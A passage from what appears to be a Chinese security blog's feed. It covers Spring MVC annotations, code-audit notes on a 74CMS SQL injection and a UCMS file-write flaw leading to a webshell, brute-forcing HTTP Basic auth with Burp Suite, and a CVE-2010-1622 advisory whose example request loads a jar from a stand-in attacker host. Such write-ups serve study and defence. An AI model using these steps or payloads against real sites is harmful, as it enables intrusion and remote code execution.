class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class HelloWorld&#123;</span><br><span class="line">    // 下面两种@Autowired只要使用一种即可</span><br><span class="line">    @Autowired</span><br><span class="line">    private UserDao userDao; // 用于字段上</span><br><span class="line">    </span><br><span class="line">    @Autowired</span><br><span class="line">    public void setUserDao(UserDao userDao) &#123; // 用于属性的方法上</span><br><span class="line">        this.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>@Autowired注解是按照类型（byType）装配依赖对象，默认情况下它要求依赖对象必须存在，如果允许null值，可以设置它的required属性为false。如果我们想使用按照名称（byName）来装配，可以结合@Qualifier注解一起使用。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public class HelloWorld&#123; 　　@Autowired 　　@Qualifier(&quot;userDao&quot;) 　　private UserDao userDao; &#125;</span><br></pre></td></tr></table></figure><p>（2）@Resource</p><p>@Resource默认按照ByName自动注入，由J2EE提供，需要导入包javax.annotation.Resource。@Resource有两个重要的属性：name和type，而Spring将@Resource注解的name属性解析为bean的名字，而type属性则解析为bean的类型。所以，如果使用name属性，则使用byName的自动注入策略，而使用type属性时则使用byType自动注入策略。如果既不制定name也不制定type属性，这时将通过反射机制使用byName自动注入策略。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class HelloWorld&#123;</span><br><span class="line">    // 下面两种@Resource只要使用一种即可</span><br><span class="line">    @Resource(name=&quot;userDao&quot;)</span><br><span class="line">    private UserDao userDao; // 用于字段上</span><br><span class="line">    </span><br><span class="line">    @Resource(name=&quot;userDao&quot;)</span><br><span class="line">    public void setUserDao(UserDao userDao) &#123; // 用于属性的setter方法上</span><br><span class="line">        this.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：最好是将@Resource放在setter方法上，因为这样更符合面向对象的思想，通过set、get去操作属性，而不是直接去操作属性。</p><h2 id="0x03-PathVariable"><a href="#0x03-PathVariable" class="headerlink" title="0x03 @PathVariable"></a>0x03 @PathVariable</h2><p>用于将请求URL中的模板变量映射到功能处理方法的参数上，即取出uri模板中的变量作为参数。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@Controller  </span><br><span class="line">public class TestController &#123;  </span><br><span class="line">     @RequestMapping(value=&quot;/user/&#123;userId&#125;/roles/&#123;roleId&#125;&quot;,method = RequestMethod.GET)  </span><br><span class="line">     public String getLogin(@PathVariable(&quot;userId&quot;) String userId,  </span><br><span class="line">         @PathVariable(&quot;roleId&quot;) String roleId)&#123;  </span><br><span class="line">         System.out.println(&quot;User Id : &quot; + userId);  </span><br><span class="line">         System.out.println(&quot;Role Id : &quot; + roleId);  </span><br><span class="line">         return &quot;hello&quot;;  </span><br><span class="line">     &#125;  </span><br><span class="line">     @RequestMapping(value=&quot;/product/&#123;productId&#125;&quot;,method = RequestMethod.GET)  </span><br><span class="line">     public String getProduct(@PathVariable(&quot;productId&quot;) String productId)&#123;  </span><br><span class="line">           System.out.println(&quot;Product Id : &quot; + productId);  </span><br><span class="line">           return &quot;hello&quot;;  </span><br><span class="line">     &#125;  </span><br><span class="line">     @RequestMapping(value=&quot;/javabeat/&#123;regexp1:[a-z-]+&#125;&quot;,  </span><br><span class="line">           method = RequestMethod.GET)  </span><br><span class="line">     public String getRegExp(@PathVariable(&quot;regexp1&quot;) String regexp1)&#123;  </span><br><span class="line">           System.out.println(&quot;URI Part 1 : &quot; + regexp1);  </span><br><span class="line">           return &quot;hello&quot;;  </span><br><span class="line">     &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-CookieValue"><a href="#0x04-CookieValue" class="headerlink" title="0x04 @CookieValue"></a>0x04 @CookieValue</h2><p>作用：用来获取Cookie中的值；</p><p>参数： value：参数名称  required：是否必须  defaultValue：默认值</p><p>使用案例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">     * 获取 Session</span><br><span class="line">     * JSESSIONID=411A032E02A2594698F6E3F4458B9CE4</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(&quot;/testCookieValue&quot;)</span><br><span class="line">    public String testCookieValue(@CookieValue(&quot;JSESSIONID&quot;) String sessionId) &#123;</span><br><span class="line">        System.out.println(&quot;JSESSIONID = &quot; + sessionId);</span><br><span class="line">        return &quot;success&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-RequestParam"><a href="#0x05-RequestParam" class="headerlink" title="0x05 @RequestParam"></a>0x05 @RequestParam</h2><p>@RequestParam用于将请求参数区数据映射到功能处理方法的参数上，用例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">     * @RequestParam(&quot;id&quot;) 带参映射</span><br><span class="line">     * @param id</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(&quot;/testRequestParam&quot;)</span><br><span class="line">    public String testRequestParam(@RequestParam(&quot;id&quot;) int id) &#123;</span><br><span class="line">        System.out.println(&quot;testRequestParam  &quot; + id);</span><br><span class="line">        return &quot;success&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-SessionAttributes"><a href="#0x06-SessionAttributes" class="headerlink" title="0x06 @SessionAttributes"></a>0x06 @SessionAttributes</h2><p>@SessionAttributes即将值放到session作用域中，写在class上面。　　</p><p>@SessionAttributes 除了可以通过属性名指定需要放到会话中的属性外（value 属性值），</p><p><em>还可以通过模型属性的对象类型指定哪些模型属性需要放到会话中（types 属性值）,用例：</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">package com.cqvie.yjq;</span><br><span class="line"></span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.SessionAttributes;</span><br><span class="line"></span><br><span class="line">import com.cqvie.model.User;</span><br><span class="line"></span><br><span class="line">@SessionAttributes(value = &#123;&quot;user&quot;&#125;, types = &#123;String.class&#125;)</span><br><span class="line">@RequestMapping(&quot;/springmvc&quot;)</span><br><span class="line">@Controller</span><br><span class="line">public class SessionAttributesTest &#123;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * @SessionAttributes</span><br><span class="line">     *         除了可以通过属性名指定需要放到会话中的属性外（value 属性值），</span><br><span class="line">     *         还可以通过模型属性的对象类型指定哪些模型属性需要放到会话中（types 属性值）。</span><br><span class="line">     * 注意： 该注解只能放在类的上面，不能放在方法上面</span><br><span class="line">     * </span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(&quot;/testSessionAttributes&quot;)</span><br><span class="line">    public String testSessionAttributes(Map&lt;String, Object&gt; map) &#123;</span><br><span class="line">        User user = new User(1, &quot;刘邦&quot;, &quot;qwe&quot;, &quot;123&quot;, &quot;辽宁&quot;);</span><br><span class="line">        map.put(&quot;user&quot;, user);</span><br><span class="line">        map.put(&quot;school&quot;, &quot;重庆&quot;);</span><br><span class="line">        return &quot;success&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x07-ModelAttribute"><a href="#0x07-ModelAttribute" class="headerlink" title="0x07 @ModelAttribute"></a>0x07 @ModelAttribute</h2><p>代表的是：该Controller的所有方法在调用前，先执行此@ModelAttribute方法，可用于注解和方法参数中，可以把这个@ModelAttribute特性，应用在BaseController当中，所有的Controller继承BaseController，即可实现在调用Controller时，先执行@ModelAttribute方法。　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">package com.cqvie.yjq;</span><br><span class="line"></span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.annotation.ModelAttribute;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line">import com.cqvie.model.User;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">@RequestMapping(&quot;/springmvc&quot;)</span><br><span class="line">public class ModelAttributeTest &#123;</span><br><span class="line"></span><br><span class="line">    private static final String SUCCESS = &quot;success&quot;;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 1.有 @ModelAttribute 标记的方法，会在每个目标方法执行之前被 SpringMVC 调用</span><br><span class="line">     * 2.@ModelAttribute注解也可以修饰目标方法POJO类形的入参，其value的属性值有如下作用：</span><br><span class="line">     *     1）SpringMVC会使用value属性值在implicitModel中查找对应的对象，若存在则直接传入到目标方法的入参中</span><br><span class="line">     *     2）SpringMVC会以value为key,POJO类型的对象为value，存入的request中</span><br><span class="line">     * </span><br><span class="line">     * @param id</span><br><span class="line">     * @param map</span><br><span class="line">     */</span><br><span class="line">    @ModelAttribute</span><br><span class="line">    public void getUser(@RequestParam(value = &quot;id&quot;, required = false) int id,</span><br><span class="line">            Map&lt;String, Object&gt; map) &#123;</span><br><span class="line">        //模拟数据库中获取对象</span><br><span class="line">        User user = new User(1, &quot;刘邦&quot;, &quot;123&quot;, &quot;023&quot;, &quot;重庆&quot;);</span><br><span class="line">        System.out.println(&quot;从数据库中获取一个对象：&quot; + user);</span><br><span class="line">        map.put(&quot;abc&quot;, user);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 运行流程：</span><br><span class="line">     *         1.执行@ModelAttribute注解修饰的方法，从数据库中取出对象，把对象放入Map中，键为：user；</span><br><span class="line">     *         2.SpringMVC从Map中取出User对象，并把表单的请求参数赋值给该User对象的对应属性；</span><br><span class="line">     *         3.SpringMVC把上述对象传入目标方法的参数。</span><br><span class="line">     * </span><br><span class="line">     * 注意：在@ModelAttribute修饰的方法中，放入到Map时的键需要和目标方法入参类型的第一个字母小写的字符串一致</span><br><span class="line">     * </span><br><span class="line">     * @param user</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(&quot;/testModelAttribute&quot;)</span><br><span class="line">    public String testModelAttribute(@ModelAttribute(&quot;abc&quot;) User user) &#123;</span><br><span class="line">        System.out.println(&quot;修改：&quot; + user);</span><br><span class="line">        return SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x08-ResponseBody"><a href="#0x08-ResponseBody" class="headerlink" title="0x08 @ResponseBody　"></a>0x08 @ResponseBody　</h2><p>作用： 该注解用于将Controller的方法返回的对象，通过适当的HttpMessageConverter转换为指定格式后，写入到Response对象的body数据区。</p><p>使用时机：返回的数据不是html标签的页面，而是其他某种格式的数据时（如json、xml等）使用；</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SpringMVC注解&quot;&gt;&lt;a href=&quot;#SpringMVC注解&quot; class=&quot;headerlink&quot; title=&quot;SpringMVC注解&quot;&gt;&lt;/a&gt;SpringMVC注解&lt;/h1&gt;&lt;h2 id=&quot;0x00-Controller&quot;&gt;&lt;a href=&quot;#0x
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>审计记录</title>
    <link href="http://bai-ren-1.github.io/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/"/>
    <id>http://bai-ren-1.github.io/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/</id>
    <published>2020-09-18T08:11:09.000Z</published>
    <updated>2020-11-18T08:23:19.379Z</updated>
    
    <content type="html"><![CDATA[<h2 id="审计记录"><a href="#审计记录" class="headerlink" title="审计记录"></a>审计记录</h2><p>记录，有时间就慢慢补充。</p><h2 id="0x00-74CMS"><a href="#0x00-74CMS" class="headerlink" title="0x00 74CMS"></a>0x00 74CMS</h2><p>3.7版本，自己上官网搜索。关注SQL注入，全局搜索select函数观察sql语句：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/1.png" alt></p><p>跟进第67处sql语句，发现直接拼接参数变量id：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/2.png" alt></p><p>这个直接拼接的sql语句是在get_color_one中写的，于是我们全局搜索get_color_one方法：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/3.png" alt></p><p>明显只有1、2、5三处是调用了这个方法，我们跟进第一个：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/4.png" alt></p><p>直接拼接GET参数，中奖了。跟进第二个:</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/5.png" alt></p><p>也是直接拼接POST参数，再次中奖。跟进第三个：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/6.png" alt></p><p>这里获取val变量后使用intval进行转换，可见不能进行注入了。</p><h2 id="0x01-UCMS"><a href="#0x01-UCMS" class="headerlink" title="0x01 UCMS"></a>0x01 UCMS</h2><p>文件操作导致写shell的命令执行，记录一下。去CNVD上看到这个漏洞：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/7.png" alt></p><p>全局搜索fopen：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/8.png" alt></p><p>跟进最后一项，发现可以操作：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/9.png" alt></p><p>里面就是根据$alldir和$filename变量打开文件并且往其中写入$content（$content的内容是我们POST直接可控的）。然后我们看上面需要什么限定：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/10.png" alt></p><p>发现$alldir和$filename变量都是我们GET直接可控的，并且需要赋值才能走到我们下面的利用点。然后最开始的要求就是要“定义了admin”。我们就看到入口文件index.php：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/11.png" alt></p><p>看到了我们定义了admin的语句啦，就说明我们不能直接访问上面的fileedit.php，否则就会admin没定义而exit；我们需要在定义了admin的index.php从找到如何进入fileedit.php：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/12.png" alt></p><p>直接提交GET参数do，然后就会根据_符号进行分割。其中分割后所得的前半部分是路径，后半部分是文件名，然后将路径和文件名得到的文件包含进来。那我们为了包含上面的fileedit.php，就得构造?do=sadmin_fileedit的参数。</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/13.png" alt></p><p>上面这样构造后就会在index.php满足中路由到sadmin/fileedit.php，然后打开根目录下的/1.php文件，检查完post中的token后就往1.php中写入post中的co，达成我们要的目的。</p><blockquote><p>这里不知道为什么我一开始直接构造post包提交后一直没有反应。得我重新在fileedit页面抓包后重新构造payload发送后才有反应？一开始我是复现不出来的。</p></blockquote><p>最后在根目录就能看到写入的文件，这里完全可以写成一个webshell：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/14.png" alt></p><p>记得进入写文件操作前有个checktoken的检查方法，得把token放在POST内容上。否则提示非法：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/15.png" alt></p><h2 id="0x02-参考链接"><a href="#0x02-参考链接" class="headerlink" title="0x02 参考链接"></a>0x02 参考链接</h2><p><a href="https://sunian19.github.io/2020/09/08/UCMS%20v.1.4.8%20Command%20execution/" target="_blank" rel="noopener">https://sunian19.github.io/2020/09/08/UCMS%20v.1.4.8%20Command%20execution/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;审计记录&quot;&gt;&lt;a href=&quot;#审计记录&quot; class=&quot;headerlink&quot; title=&quot;审计记录&quot;&gt;&lt;/a&gt;审计记录&lt;/h2&gt;&lt;p&gt;记录，有时间就慢慢补充。&lt;/p&gt;
&lt;h2 id=&quot;0x00-74CMS&quot;&gt;&lt;a href=&quot;#0x00-74CMS&quot; cla
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Ucms</title>
    <link href="http://bai-ren-1.github.io/2020/08/26/Ucms/"/>
    <id>http://bai-ren-1.github.io/2020/08/26/Ucms/</id>
    <published>2020-08-26T03:01:19.000Z</published>
    <updated>2020-12-26T03:03:58.439Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Ucms"><a href="#Ucms" class="headerlink" title="Ucms"></a>Ucms</h2><p>写着玩。</p><p><img src="/2020/08/26/Ucms/1.png" alt></p><p>全局搜索fopen：</p><p><img src="/2020/08/26/Ucms/2.png" alt></p><p>跟进最后一项，发现可以操作：</p><p><img src="/2020/08/26/Ucms/3.png" alt></p><p>里面就是根据$alldir和$filename变量打开文件并且往其中写入$content（$content的内容是我们POST直接可控的）。然后我们看上面需要什么限定：</p><p><img src="/2020/08/26/Ucms/4.png" alt></p><p>发现$alldir和$filename变量都是我们GET直接可控的，并且需要赋值才能走到我们下面的利用点。然后最开始的要求就是要“定义了admin”。我们就看到入口文件index.php：</p><p><img src="/2020/08/26/Ucms/5.png" alt></p><p>看到了我们定义了admin的语句啦，就说明我们不能直接访问上面的fileedit.php，否则就会admin没定义而exit；我们需要在定义了admin的index.php从找到如何进入fileedit.php：</p><p><img src="/2020/08/26/Ucms/6.png" alt></p><p>直接提交GET参数do，然后就会根据_符号进行分割。其中分割后所得的前半部分是路径，后半部分是文件名，然后将路径和文件名得到的文件包含进来。那我们为了包含上面的fileedit.php，就得构造?do=sadmin_fileedit的参数。</p><p><img src="/2020/08/26/Ucms/7.png" alt></p><p>最后在根目录就能看到写入的文件，这里完全可以写成一个webshell。</p><p>记得进入写文件操作前有个checktoken的检查方法，得把token放在POST内容上。否则提示非法：</p><p><img src="/2020/08/26/Ucms/9.png" alt></p><p><a href="https://sunian19.github.io/2020/09/08/UCMS%20v.1.4.8%20Command%20execution/" target="_blank" rel="noopener">https://sunian19.github.io/2020/09/08/UCMS%20v.1.4.8%20Command%20execution/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Ucms&quot;&gt;&lt;a href=&quot;#Ucms&quot; class=&quot;headerlink&quot; title=&quot;Ucms&quot;&gt;&lt;/a&gt;Ucms&lt;/h2&gt;&lt;p&gt;写着玩。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/08/26/Ucms/1.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;全局搜索
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Burpsuite爆破Basic认证</title>
    <link href="http://bai-ren-1.github.io/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/"/>
    <id>http://bai-ren-1.github.io/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/</id>
    <published>2020-08-24T08:54:02.000Z</published>
    <updated>2020-09-05T05:25:50.026Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Burpsuite爆破Basic认证"><a href="#Burpsuite爆破Basic认证" class="headerlink" title="Burpsuite爆破Basic认证"></a>Burpsuite爆破Basic认证</h1><p>做个弟弟，记录别人十多年前就用过，自己今天才遇到并记录的东西。</p><h2 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h2><p>要日一个东西，发现有个Basic认证。抓个包看到其数据是放在了请求包的报文头中。</p><p><img src="/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/1.png" alt></p><p>简单能看出Basic的认证是以<code>用户名：密码</code>形式存在，然后进行Base64编码并发送：</p><p><img src="/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/2.png" alt></p><p>现在要对他进行爆破，就得选择好用户密码两部分的payload，拼接并进行Base64编码后爆破。在BP上怎么实现？</p><h2 id="0x01-实现"><a href="#0x01-实现" class="headerlink" title="0x01 实现"></a>0x01 实现</h2><p>我们依然把认证看做一个整体，随便选择Sniper模式进行爆破。</p><p><img src="/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/3.png" alt></p><blockquote><p>Sniper 单参数爆破，多参数时同一个字典按顺序替换各参数，总之初始值有一个参数不变；</p><p>Battering ram 多参数同时爆破，但用的是同一个字典；</p><p>Pichfork 多参数同时爆破，但用的是不同的字典；</p><p>Cluster bomb 多参数做笛卡尔乘积模式爆破；</p></blockquote><p>套路就在于在设置payload那里可以选择模式，我们选择为<code>Custom iterator</code>。然后根据Basic的三部分去拆分三部分的payload，具体操作如下。首先操作第一部分就是用户名：</p><p><img src="/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/5.png" alt></p><p>第二部分就是分隔符号：</p><p><img src="/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/6.png" alt></p><p>第三部分就是密码：</p><p><img src="/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/7.png" alt></p><p>选择好各个部分的payload后，我们给他加一层Base64编码即可构成字典啦：</p><p><img src="/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/8.png" alt></p><p>爆破。可以看到确实生成了对应格式的Base64编码的payload：</p><p><img src="/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/9.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Burpsuite爆破Basic认证&quot;&gt;&lt;a href=&quot;#Burpsuite爆破Basic认证&quot; class=&quot;headerlink&quot; title=&quot;Burpsuite爆破Basic认证&quot;&gt;&lt;/a&gt;Burpsuite爆破Basic认证&lt;/h1&gt;&lt;p&gt;做个弟弟，记
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Spring漏洞集合</title>
    <link href="http://bai-ren-1.github.io/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/"/>
    <id>http://bai-ren-1.github.io/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</id>
    <published>2020-08-12T12:12:58.000Z</published>
    <updated>2020-11-18T08:26:30.728Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Spring漏洞集合"><a href="#Spring漏洞集合" class="headerlink" title="Spring漏洞集合"></a>Spring漏洞集合</h1><p>转载自</p><p><a href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/" target="_blank" rel="noopener">https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</a></p><h2 id="0x00-CVE-2010-1622-Spring-Framework-class-classLoader类远程代码执行"><a href="#0x00-CVE-2010-1622-Spring-Framework-class-classLoader类远程代码执行" class="headerlink" title="0x00 CVE-2010-1622 Spring Framework class.classLoader类远程代码执行"></a>0x00 CVE-2010-1622 Spring Framework class.classLoader类远程代码执行</h2><blockquote><p>影响版本：SpringSource Spring Framework 3.0.0 - 3.0.2、SpringSource Spring Framework 2.5.0 - 2.5.7</p></blockquote><p>Spring框架提供了一种机制，该机制使用客户端提供的数据来更新对象属性。这个机制允许攻击者修改用于加载对象的类加载器的属性（通过’class.classloader’）。这可能导致任意命令执行，例如，攻击者可以修改URL。由类加载器用来指向攻击者控制的位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">示例：POST /adduser HTTP/1.0</span><br><span class="line">...</span><br><span class="line">firstName = Tavis&amp;lastName = Ormandy</span><br><span class="line"></span><br><span class="line">如果Person是表单的支持对象，则firstName和lastName属性将设置为相应的值。为了支持更复杂的类，Spring还支持点表示法，因此user.address.street = Disclosure + Str。</span><br><span class="line"></span><br><span class="line">将等效于：frmObj.getUser().getAddress().setStreet(&quot;Disclosure Str.&quot;)  </span><br><span class="line">问题是Spring Beans的CachedIntrospectionResults类枚举了可从用户表单提交中设置的属性，使用  java.beans.Introspector.getBeanInfo()而不指定停止类，这意味着&apos; class &apos;属性及其后的所有内容均可用于HTTP请求中的设置。</span><br><span class="line"></span><br><span class="line">攻击</span><br><span class="line">如果攻击者使用以下HTTP参数向表单控制器提交HTTP请求：</span><br><span class="line">POST /adduser HTTP/1.0</span><br><span class="line">...</span><br><span class="line">class.classLoader.URLs[0] = jar:http://attacker/spring-exploit.jar!</span><br><span class="line"></span><br><span class="line">它将使用自己的网址覆盖frmObj.getClass().getClassLoader().getURLs() 返回的数组中的第0个元素.它将是哪个类加载器？</span><br><span class="line"></span><br><span class="line">在Apache Tomcat上的情况下，它指org.apache.catalina.loader.WebappClassLoader</span><br></pre></td></tr></table></figure><p>如何构造这个jar，需要包含以下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- META-INF/spring-form.tld - 定义spring表单标签并指定实现为标签文件而不是类</span><br><span class="line">- 